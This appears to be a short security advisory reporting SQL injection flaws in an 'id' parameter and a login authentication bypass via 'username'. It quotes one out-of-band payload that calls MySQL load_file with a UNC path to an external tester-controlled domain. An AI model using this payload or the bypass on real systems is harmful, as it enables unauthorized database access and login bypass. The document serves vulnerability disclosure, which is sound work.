## Description:
The id parameter appears to be vulnerable to three type of SQL injection attacks, boolean-based blind, error-based and UNION query. The payload '+(select load_file('\\\\hh2s4z961nps5mtx8px8zoud248ywq0erhf82yqn.nu11secur1tyexploit.net\\ggc'))+' was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. Also, user login is vulnerable to SQL-Injection bypass authentication on parameter "username".
